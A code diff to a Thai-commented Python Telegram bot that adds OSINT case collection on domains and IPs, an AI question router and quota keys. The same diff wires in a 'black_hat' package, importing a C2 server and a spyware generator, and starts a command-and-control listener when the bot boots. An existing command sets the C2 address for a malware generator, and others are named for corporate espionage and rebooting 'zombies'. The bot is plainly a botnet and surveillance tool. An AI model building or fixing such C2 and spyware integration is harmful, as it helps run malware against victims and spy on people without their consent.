@@ -3,7 +3,7 @@ import json
 import socket
 import struct
 import traceback
-from typing import Dict, List, Callab, Optional
+from typing import Dict, List, Callable, Optional
 import os
 import re
 import sys
@@ -34,7 +34,7 @@ from telegram.error import TelegramError
 import detection
 import search
 import scrape
-import osint
+import osint_core as osint
 import osint_db
 import osint_es
 import search_es
@@ -49,6 +49,11 @@ from security import security_db_init, write_audit_log
 import gemini
 from gemini import ask_gemini, split_telegram_message
 from quota import quota_db_init, check_and_use_quota
+import quota_keys
+import ai_router
+import osint_cases
+from osint import collector as osint_collector
+from osint import case_report as osint_case_report
 from analytics import analytics_db_init, record_message_activity, get_group_summary
 from news import news_db_init, run_news_check_cycle, news_background_loop
 from scope_policy import (
@@ -1292,6 +1297,370 @@ async def osint_db_callback_handler(update: Update, context: ContextTypes.DEFAUL
             osint_db.format_saved_summary(record, result) + es_note)
     except TelegramError as e:
         logger.info("OSINT DB SAVE EDIT FAILED: %s", e)
+
+
+# ---------------- OSINT Collector (/osint, /browse) ----------------
+
+_OSINT_CASE_CB = "osintcase"                    # prefix ของ callback_data เคส /osint
+_OSINT_CASE_PENDING_KEY = "_osint_pending_cases"
+_OSINT_CASE_PENDING_MAX = 20
+_HEX64_RE = re.compile(r"^[0-9a-f]{64}$", re.IGNORECASE)
+
+
+def _osint_case_keyboard(token: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("💾 บันทึกเคสลงฐานข้อมูล (Admin)",
+                             callback_data=f"{_OSINT_CASE_CB}:save:{token}"),
+        InlineKeyboardButton("❌ ไม่บันทึก",
+                             callback_data=f"{_OSINT_CASE_CB}:cancel:{token}"),
+    ]])
+
+
+async def cmd_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/osint target <โดเมน|IP> — เก็บข่าวกรองจากแหล่งเปิดแบบเต็ม (crt.sh, DNS,
+    RDAP/WHOIS, tech/security headers, HIBP, Google dork) แล้วสรุปเป็น "ระดับความ
+    ปลอดภัย" ของเว็บไซต์ พร้อมโปรไฟล์เป้าหมาย
+
+    เข้าถึงได้เฉพาะ Admin (แนวเดียวกับ /search) — เก็บเฉพาะข้อมูลสาธารณะ ไม่แตะ/ไม่
+    โจมตีระบบเป้าหมาย ผลในกลุ่มแสดงแบบเข้ารหัส (SHA-256) ฉบับเต็มดูส่วนตัวด้วย /browse
+    """
+    if not await is_admin(update, context):
+        return await update.message.reply_text("❌ /osint ใช้ได้เฉพาะ Admin")
+
+    args = list(context.args or [])
+    # รองรับทั้ง "/osint target example.com" และ "/osint example.com"
+    if args and args[0].lower() == "target":
+        args = args[1:]
+    raw_target = args[0].strip() if args else ""
+    if not raw_target:
+        return await update.message.reply_text(
+            "ใช้งาน: /osint target <โดเมน หรือ IP>\n"
+            "ตัวอย่าง:\n  /osint target example.com\n  /osint 8.8.8.8")
+
+    kind = osint_collector.detect_kind(raw_target)
+    if kind is None:
+        return await update.message.reply_text(
+            "❌ เป้าหมายต้องเป็นโดเมนหรือ IP ที่ถูกต้อง (เช่น example.com หรือ 8.8.8.8)")
+
+    if not osint_collector.HAVE_HTTPX:
+        return await update.message.reply_text(
+            "⚠️ ต้องติดตั้ง httpx ก่อนใช้ /osint (pip install httpx)")
+
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+
+    allowed, used, limit = check_and_use_quota(chat_id, user_id, True)
+    if not allowed:
+        return await update.message.reply_text(
+            f"ใช้งานเกินโควตาวันนี้แล้ว ({used}/{limit} ครั้ง)")
+
+    write_audit_log(chat_id, user_id, actor="admin", action="OSINT_COLLECT",
+                    detail=f"{kind}:{raw_target}"[:500])
+
+    status_msg = None
+    try:
+        status_msg = await update.message.reply_text(
+            f"🔎 กำลังเก็บข่าวกรองจากแหล่งเปิดของ {raw_target} … (อาจใช้เวลาสักครู่)")
+    except TelegramError:
+        pass
+    await context.bot.send_chat_action(chat_id, ChatAction.TYPING)
+
+    try:
+        case = await osint_collector.collect(raw_target, actor=user_id)
+    except Exception:
+        logger.exception("OSINT COLLECT ERROR target=%s", raw_target)
+        if status_msg is not None:
+            await safe_delete(status_msg, chat_id, context)
+        return await update.message.reply_text(
+            "⚠️ เก็บข่าวกรองไม่สำเร็จ (เกิดข้อผิดพลาดภายใน) ลองใหม่อีกครั้ง")
+
+    if status_msg is not None:
+        await safe_delete(status_msg, chat_id, context)
+
+    # ผลในกลุ่ม: สรุปแบบเข้ารหัส (SHA-256) — ไม่เผยรายละเอียดจริง
+    await _reply_chunked(update, osint_case_report.group_summary(case))
+
+    # เสนอปุ่มบันทึกเคสฉบับเต็มลงฐานข้อมูล (เฉพาะ Admin กดได้)
+    store = context.chat_data.setdefault(_OSINT_CASE_PENDING_KEY, {})
+    while len(store) >= _OSINT_CASE_PENDING_MAX:
+        store.pop(next(iter(store)))
+    token = secrets.token_urlsafe(8)
+    store[token] = {"case": case, "requested_by": user_id}
+    try:
+        await update.message.reply_text(
+            "💾 ต้องการบันทึกเคสนี้ (ฉบับเต็ม) ลงฐานข้อมูลข่าวกรองหรือไม่?\n"
+            f"บันทึกแล้วเรียกดูภายหลังด้วย /browse {case['case_id']}",
+            reply_markup=_osint_case_keyboard(token))
+    except TelegramError as e:
+        logger.info("OSINT CASE SAVE OFFER FAILED: %s", e)
+        store.pop(token, None)
+
+
+async def osint_case_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """ยืนยัน/ยกเลิกการบันทึกเคส /osint — บันทึกได้เฉพาะ Admin (ตรวจซ้ำที่ชั้น callback)"""
+    query = update.callback_query
+    parts = (query.data or "").split(":")
+    if len(parts) < 3 or parts[0] != _OSINT_CASE_CB:
+        return await query.answer()
+    action, token = parts[1], parts[2]
+
+    if not await is_admin(update, context):
+        return await query.answer("❌ บันทึกได้เฉพาะ Admin", show_alert=True)
+
+    store = context.chat_data.get(_OSINT_CASE_PENDING_KEY, {})
+    payload = store.get(token)
+
+    if action == "cancel":
+        store.pop(token, None)
+        await query.answer("ยกเลิกแล้ว")
+        try:
+            return await query.edit_message_text("❌ ไม่บันทึกเคสลงฐานข้อมูล")
+        except TelegramError:
+            return
+    if action != "save":
+        return await query.answer()
+    if payload is None:
+        await query.answer("คำขอนี้หมดอายุแล้ว", show_alert=True)
+        try:
+            return await query.edit_message_text(
+                "⚠️ คำขอบันทึกหมดอายุ (บอตอาจรีสตาร์ต) — สั่ง /osint แล้วกดบันทึกใหม่")
+        except TelegramError:
+            return
+
+    await query.answer("กำลังบันทึก…")
+    case = payload["case"]
+    try:
+        result = await asyncio.to_thread(osint_cases.save_case, case)
+    except Exception:
+        logger.exception("OSINT CASE SAVE ERROR token=%s", token)
+        try:
+            return await query.edit_message_text("⚠️ บันทึกเคสไม่สำเร็จ ลองใหม่อีกครั้ง")
+        except TelegramError:
+            return
+
+    store.pop(token, None)
+    write_audit_log(update.effective_chat.id, update.effective_user.id,
+                    actor="admin", action="OSINT_CASE_SAVE",
+                    detail=f"id={result.get('case_id')} target={case.get('target')}")
+
+    es_note = ""
+    if not result.get("duplicate"):
+        try:
+            if await asyncio.to_thread(osint_cases.index_case_es, case):
+                es_note = "\n🔎 ทำดัชนีลง Elasticsearch แล้ว"
+        except Exception:
+            logger.exception("OSINT CASE ES INDEX ERROR")
+
+    msg = ("ℹ️ เคสนี้เคยถูกบันทึกไว้แล้ว (ไม่บันทึกซ้ำ)"
+           if result.get("duplicate") else "✅ บันทึกเคสลงฐานข้อมูลเรียบร้อย")
+    try:
+        await query.edit_message_text(
+            f"{msg}\n🆔 {result.get('case_id')}\n"
+            f"🗂️ รวมในฐานข้อมูล: {result.get('total')} เคส"
+            f"\nดูฉบับเต็ม: /browse {result.get('case_id')}" + es_note)
+    except TelegramError:
+        pass
+
+
+async def cmd_browse(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/browse <case_id หรือ target>[/<คำค้น>] — ดึงเคส OSINT ฉบับเต็ม ส่งเข้า DM
+    เพื่อรักษาความลับ (ในกลุ่มจะบอกเพียงว่าส่ง DM แล้ว)"""
+    if not await is_admin(update, context):
+        return await update.message.reply_text("❌ /browse ใช้ได้เฉพาะ Admin")
+
+    arg = " ".join(context.args or []).strip()
+    if not arg:
+        recent = osint_cases.list_cases(limit=10)
+        if not recent:
+            return await update.message.reply_text(
+                "ยังไม่มีเคสในฐานข้อมูล — ใช้ /osint target <โดเมน> แล้วกดบันทึกก่อน")
+        lines = ["🗂️ เคสล่าสุด (ใช้ /browse <case_id> เพื่อดูฉบับเต็ม):", ""]
+        for r in recent:
+            lines.append(f"• {r['case_id']} — {r['target']} "
+                         f"[{r.get('security_level', '-')}]")
+        return await _reply_chunked(update, "\n".join(lines))
+
+    case_ref, _, sub_query = arg.partition("/")
+    case_ref = case_ref.strip()
+    case = await asyncio.to_thread(osint_cases.get_case, case_ref)
+    if case is None:
+        hits = await asyncio.to_thread(osint_cases.search_cases, case_ref, 5)
+        if not hits:
+            return await update.message.reply_text(
+                f"❌ ไม่พบเคสที่ตรงกับ {case_ref!r}")
+        if len(hits) == 1:
+            case = hits[0]
+        else:
+            lines = [f"พบ {len(hits)} เคสที่เกี่ยวข้อง — ระบุ case_id ให้ชัด:", ""]
+            for c in hits:
+                lines.append(f"• {c['case_id']} — {c['target']}")
+            return await _reply_chunked(update, "\n".join(lines))
+
+    write_audit_log(update.effective_chat.id, update.effective_user.id,
+                    actor="admin", action="OSINT_BROWSE",
+                    detail=f"id={case.get('case_id')} q={sub_query[:100]}")
+
+    report = osint_case_report.full_report(case)
+    if sub_query.strip():
+        q = sub_query.strip().lower()
+        report = "\n".join(ln for ln in report.splitlines()
+                           if q in ln.lower()) or f"(ไม่มีบรรทัดที่ตรงกับ {sub_query!r})"
+
+    user_id = update.effective_user.id
+    delivered_dm = False
+    try:
+        for chunk in split_telegram_message(report):
+            await context.bot.send_message(user_id, chunk)
+        delivered_dm = True
+    except TelegramError:
+        delivered_dm = False
+
+    if delivered_dm and update.effective_chat.type != "private":
+        await update.message.reply_text("📩 ส่งเคสฉบับเต็มให้ทาง DM แล้ว")
+    elif not delivered_dm:
+        # ส่ง DM ไม่ได้ (ผู้ใช้ยังไม่เคยเริ่มแชทกับบอต) — แจ้งวิธีและตอบในที่เดิม
+        await update.message.reply_text(
+            "⚠️ ส่ง DM ไม่ได้ (กรุณาเริ่มแชทส่วนตัวกับบอตก่อน) — แสดงในที่นี้แทน")
+        await _reply_chunked(update, report)
+
+
+# ---------------- AI Router (/ask_ai) + Quota Keys ----------------
+
+_AI_ROUTER_SYSTEM = (
+    "You are SomBra, a precise cybersecurity assistant for an authorized "
+    "red/blue-team lab. Answer accurately and concisely. Reply in the user's "
+    "language (Thai if they write Thai)."
+)
+
+
+def _extract_key(text: str):
+    """แยกโทเคนคีย์ (hex 64 ตัว) ออกจากข้อความ คืน (key_or_None, remaining_text)"""
+    tokens = text.split()
+    key = None
+    rest = []
+    for t in tokens:
+        if key is None and _HEX64_RE.match(t):
+            key = t.lower()
+        else:
+            rest.append(t)
+    return key, " ".join(rest).strip()
+
+
+async def cmd_ask_ai(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/ask_ai <ข้อความ> — ถาม AI ผ่านระบบเลือกโมเดลอัตโนมัติ (หลายผู้ให้บริการ +
+    fallback) สมาชิกทั่วไปต้องมี "คีย์โควตา" ส่วนตัว (อายุ 3 วันนับจากใช้ครั้งแรก)
+    ก่อนใช้ — ส่งคีย์มาพร้อมข้อความครั้งแรกเพื่อผูกคีย์ เช่น /ask_ai <คีย์> คำถาม
+    Admin ใช้ได้โดยไม่ต้องมีคีย์
+    """
+    text = " ".join(context.args or []).strip()
+    key, prompt = _extract_key(text)
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    username = update.effective_user.username or ""
+    admin = await is_admin(update, context)
+
+    # ตรวจสิทธิ์คีย์สำหรับสมาชิกทั่วไป
+    if not admin:
+        quota_keys.purge_expired()
+        if key:
+            ok, reason, info = await asyncio.to_thread(
+                quota_keys.redeem_key, key, user_id, username)
+            if not ok:
+                msgmap = {
+                    "not_found": "❌ ไม่พบคีย์นี้ในระบบ",
+                    "revoked": "❌ คีย์นี้ถูกเพิกถอนแล้ว",
+                    "bound_other": "❌ คีย์นี้ถูกผูกกับผู้ใช้อื่นแล้ว",
+                    "expired": "❌ คีย์นี้หมดอายุแล้ว (อายุ 3 วันนับจากใช้ครั้งแรก)",
+                }
+                return await update.message.reply_text(msgmap.get(reason, "❌ คีย์ใช้ไม่ได้"))
+        else:
+            active = await asyncio.to_thread(quota_keys.active_key_for_user, user_id)
+            if active is None:
+                return await update.message.reply_text(
+                    "🔑 ต้องมีคีย์โควตา AI ก่อนใช้ /ask_ai\n"
+                    "ส่งคีย์พร้อมคำถามครั้งแรกเพื่อเปิดใช้งาน (อายุ 3 วัน):\n"
+                    "  /ask_ai <คีย์ของคุณ> <คำถาม>\n"
+                    "ยังไม่มีคีย์? ขอจากแอดมิน (แอดมินสร้างด้วย /generate_keys)")
+            # มีคีย์ที่ใช้งานได้อยู่แล้ว — ผ่าน (การนับการใช้รายวันทำที่ check_and_use_quota)
+
+    if not prompt:
+        return await update.message.reply_text(
+            "ใช้งาน: /ask_ai <คำถาม>\nตัวอย่าง: /ask_ai อธิบาย CSP header สั้น ๆ")
+
+    if not ai_router.router_configured():
+        # ถอยไปใช้ gemini.ask_gemini เดิมถ้ายังไม่ได้ตั้งผู้ให้บริการหลายเจ้า
+        allowed, used, limit = check_and_use_quota(chat_id, user_id, admin)
+        if not allowed:
+            return await update.message.reply_text(
+                f"ใช้งานเกินโควตาวันนี้แล้ว ({used}/{limit} ครั้ง)")
+        ok, reply = await gemini.ask_gemini(prompt)
+        return await _reply_chunked(update, reply)
+
+    allowed, used, limit = check_and_use_quota(chat_id, user_id, admin)
+    if not allowed:
+        return await update.message.reply_text(
+            f"ใช้งานเกินโควตาวันนี้แล้ว ({used}/{limit} ครั้ง)")
+
+    write_audit_log(chat_id, user_id, actor=("admin" if admin else "user"),
+                    action="ASK_AI", detail=prompt[:300])
+    await context.bot.send_chat_action(chat_id, ChatAction.TYPING)
+
+    result = await ai_router.route(prompt, system=_AI_ROUTER_SYSTEM)
+    if not result.ok:
+        logger.warning("ASK_AI | router ล้มเหลว: %s (ลอง: %s)",
+                       result.reason, ", ".join(result.tried))
+        return await update.message.reply_text(
+            "⚠️ ผู้ให้บริการ AI ไม่พร้อมใช้งานในขณะนี้ (ลองทุกเจ้าแล้ว) กรุณาลองใหม่ภายหลัง")
+
+    footer = f"\n\n🧠 via {result.provider}/{result.model} ({result.task})"
+    await _reply_chunked(update, result.text + footer)
+
+
+async def cmd_generate_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/generate_keys [จำนวน] — (Admin) สร้างคีย์โควตา AI ชุดใหม่ แล้วส่งคีย์ดิบทาง DM
+    (คีย์ดิบแสดงครั้งเดียว ระบบเก็บเฉพาะ hash)"""
+    if not await is_admin(update, context):
+        return await update.message.reply_text("❌ /generate_keys ใช้ได้เฉพาะ Admin")
+    try:
+        count = int((context.args or ["30"])[0])
+    except (ValueError, IndexError):
+        count = 30
+
+    created = await asyncio.to_thread(quota_keys.generate_keys, count,
+                                      update.effective_user.id)
+    if not created:
+        return await update.message.reply_text("⚠️ สร้างคีย์ไม่สำเร็จ")
+
+    write_audit_log(update.effective_chat.id, update.effective_user.id,
+                    actor="admin", action="GENERATE_KEYS", detail=f"count={len(created)}")
+
+    lines = [f"🔑 คีย์โควตา AI ใหม่ {len(created)} ใบ (เก็บเป็นความลับ แสดงครั้งเดียว):", ""]
+    for item in created:
+        lines.append(f"{item['label']}: {item['key']}")
+    delivered = False
+    try:
+        for chunk in split_telegram_message("\n".join(lines)):
+            await context.bot.send_message(update.effective_user.id, chunk)
+        delivered = True
+    except TelegramError:
+        delivered = False
+
+    if delivered and update.effective_chat.type != "private":
+        await update.message.reply_text(
+            f"📩 สร้างคีย์ {len(created)} ใบและส่งให้ทาง DM แล้ว")
+    elif not delivered:
+        await update.message.reply_text(
+            "⚠️ ส่ง DM ไม่ได้ (เริ่มแชทส่วนตัวกับบอตก่อน) — ยังไม่ได้แสดงคีย์เพื่อความปลอดภัย")
+
+
+async def cmd_list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/list_keys — (Admin) ตารางสรุปสถานะคีย์ทั้งหมด (ชื่อสมมติ ไม่โชว์คีย์จริง)
+    ลบคีย์หมดอายุอัตโนมัติก่อนแสดง"""
+    if not await is_admin(update, context):
+        return await update.message.reply_text("❌ /list_keys ใช้ได้เฉพาะ Admin")
+    await asyncio.to_thread(quota_keys.purge_expired)
+    rows = await asyncio.to_thread(quota_keys.list_keys)
+    await _reply_chunked(update, quota_keys.format_key_table(rows))
 
 
 # ---------------- OSINT Search ----------------
@@ -3571,6 +3940,39 @@ async def reboot_zombies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Reboot signal sent.")
     
 # -------- Bot Integration --------
+# ดึงค่าคงที่/คลาสของโมดูล black_hat เข้ามาแบบป้องกันความล้มเหลว (import ทั้งสอง
+# โมดูลไม่มี side-effect ตอนโหลด — ซ็อกเก็ตอยู่ในเมทอด, โค้ดจริงอยู่ใต้ __main__)
+# ถ้าโฟลเดอร์ black_hat หายไป/พัง บอตยังต้อง import ได้ จึงมี fallback ให้ครบ
+try:
+    from black_hat.c2_server import C2Server, ACTIVE_BOTS
+except Exception:  # pragma: no cover - black_hat optional/absent
+    ACTIVE_BOTS = {}
+
+    class C2Server:  # fallback stub — keeps app importable without black_hat
+        def __init__(self, *a, **k):
+            pass
+
+        async def start_listening(self, *a, **k):
+            return None
+
+        async def send_command(self, *a, **k):
+            return False
+
+        def stop(self):
+            pass
+
+try:
+    from black_hat.payload_create import (
+        C2_SERVER_DEFAULT_IP, C2_PORT_DEFAULT, SpywareGenerator,
+        MALWARE_OUTPUT_DIR, PYTHON_PATH, ADMIN_IDS,
+    )
+except Exception:  # pragma: no cover
+    C2_SERVER_DEFAULT_IP = "127.0.0.1"
+    C2_PORT_DEFAULT = 4444
+    MALWARE_OUTPUT_DIR = "./payloads"
+    PYTHON_PATH = sys.executable
+    ADMIN_IDS = []
+    SpywareGenerator = None
 
 C2_SERVER_IP = C2_SERVER_DEFAULT_IP
 C2_SERVER_PORT = C2_PORT_DEFAULT
@@ -3580,22 +3982,22 @@ async def set_c2_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     Command: /c2_server <IP>
     Sets the target C2 IP address for the malware generator.
     """
+    global C2_SERVER_IP
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("Access Denied. Admin Only.")
         return
-        
+
     if len(context.args) < 1:
         await update.message.reply_text(f"Usage: /c2_server <IP_ADDRESS>\nCurrent IP: {C2_SERVER_IP}")
         return
-        
+
     ip_address = context.args[0]
-    
+
     # Basic IP validation regex
     if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip_address):
         await update.message.reply_text("Invalid IP format.")
         return
-        
-    global C2_SERVER_IP
+
     C2_SERVER_IP = ip_address
     
     await update.message.reply_text(
@@ -3682,8 +4084,9 @@ async def cmd_statuss(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not cmd_statuss: all_ok = False
             
     status_msg = "System Ready." if all_ok else "System Configuration Issues Detected."
-    await update.message.reply_text(f"{status_msg}\n{report}", parse_mode="Markdown"
-        
+    await update.message.reply_text(f"{status_msg}\n{report}", parse_mode="Markdown")
+
+
 # ---------------- GitHub Repository Manager (Phase 7) ----------------
 #
 # /github clone and /github cleanup are admin-gated, matching every
@@ -5883,9 +6286,16 @@ async def post_init(app):
     # EXPIRED. Started here on the same create_task/cancel lifecycle as the
     # news loop, which is the pattern its own docstring says it mirrors.
     _start_background_task(app, "github_sweep_task", github_sweep_loop)
-    
+    # C2 listener (black_hat) — เริ่มในลูปตรงนี้แทนที่จะเริ่มใน main() ที่เป็น sync
+    # ครอบด้วย try เพราะ black_hat เป็นส่วนเสริม (อาจเป็น stub/ไม่มี) — ล้มเหลวไม่บล็อกบูต
+    if hasattr(C2_SERVER, "start_listening"):
+        try:
+            _start_background_task(app, "c2_task", lambda: C2_SERVER.start_listening())
+        except Exception:
+            logger.exception("C2: could not start listener (bot continues)")
+
 async def post_shutdown(app):
-    for key in ("news_task", "github_sweep_task"):
+    for key in ("news_task", "github_sweep_task", "c2_task"):
         task = app.bot_data.get(key)
         if not task:
             continue
@@ -5916,7 +6326,7 @@ _REQUIRED_MODULE_API = {
     "scrape": ("scrape_multiple", "scrape_single", "scrape_multiple_async",
                "fetch_content_and_files", "fetch_content_and_files_multi_async",
                "extract_content_and_files", "CONTENT_UNAVAILABLE_MARKER"),
-    "osint": ("extract_selectors", "plan_queries", "merge_and_rank",
+    "osint_core": ("extract_selectors", "plan_queries", "merge_and_rank",
               "build_sources", "verify_sources", "build_identity",
               "pivot_queries", "build_dossier", "format_search_report",
               "load_site_db", "profile_url_candidates", "build_profile_results",
@@ -6026,9 +6436,9 @@ def log_tor_status() -> bool:
 C2_SERVER = C2Server()
 
 def main():
-    # Start C2 Server in a separate thread/task
-    asyncio.create_task(C2_SERVER.start_listening())
-    
+    # หมายเหตุ: การสตาร์ท C2 listener ถูกย้ายไป post_init() ซึ่งรันอยู่ใน event loop
+    # แล้ว — เดิมเรียก asyncio.create_task() ตรงนี้ใน main() ที่เป็นฟังก์ชัน sync ทำให้
+    # "RuntimeError: no running event loop" และบอตตายตั้งแต่บูต
     if not BOT_TOKEN:
         raise SystemExit("BOT_TOKEN is not set. Please check .env file")
         
@@ -6045,6 +6455,7 @@ def main():
     config.log_startup_summary()
     db_info()
     quota_db_init()
+    quota_keys.quota_keys_db_init()
     security_db_init()
     analytics_db_init()
     news_db_init()
@@ -6101,7 +6512,6 @@ def main():
         logger.exception("REFDATA: ซิงก์ตอน startup ผิดพลาด (ใช้ไฟล์ในเครื่องต่อได้)")
     
     app = (
-        Application.builder().token("BOT_TOKEN").build()
         ApplicationBuilder()
         .token(BOT_TOKEN)
         .post_init(post_init)
@@ -6129,6 +6539,11 @@ def main():
     app.add_handler(CommandHandler("identity", cmd_personal_identity))
     app.add_handler(CommandHandler("corporate", cmd_corporate_espionage))
     app.add_handler(CommandHandler("search", cmd_search))
+    app.add_handler(CommandHandler("osint", cmd_osint))
+    app.add_handler(CommandHandler("browse", cmd_browse))
+    app.add_handler(CommandHandler("ask_ai", cmd_ask_ai))
+    app.add_handler(CommandHandler("generate_keys", cmd_generate_keys))
+    app.add_handler(CommandHandler("list_keys", cmd_list_keys))
     app.add_handler(CommandHandler("dbsearch", cmd_dbsearch))
     app.add_handler(CommandHandler("dbstats", cmd_dbstats))
     app.add_handler(CommandHandler("airport", cmd_airport))
@@ -6199,6 +6614,7 @@ def main():
     app.add_handler(CommandHandler("integrity", cmd_integrity))
     app.add_handler(CallbackQueryHandler(debt_callback_handler, pattern=r"^debt:"))
     app.add_handler(CallbackQueryHandler(osint_db_callback_handler, pattern=r"^osintdb:"))
+    app.add_handler(CallbackQueryHandler(osint_case_callback_handler, pattern=r"^osintcase:"))
     app.add_handler(CallbackQueryHandler(help_callback_handler, pattern=r"^help:"))
     # Behavioral Intelligence Engine — passive, public-data behavioural analysis.
     # register_all is collision-safe (skips any command already registered, e.g.
@@ -6248,19 +6664,6 @@ def main():
             logger.exception("PLATFORM: handler registration failed (core bot unaffected)")
 
     app.add_error_handler(error_handler)
-    
-    await application.initialize()
-    await application.start()
-    await application.updater.start_polling()
-    
-    try:
-        await application.updater.start_polling()
-    except KeyboardInterrupt:
-        pass
-    finally:
-        C2_SERVER.stop()
-        await application.stop()
-        await application.shutdown()
 
     logger.info("HANDLERS: OK")
     logger.info("POLLING: STARTED")
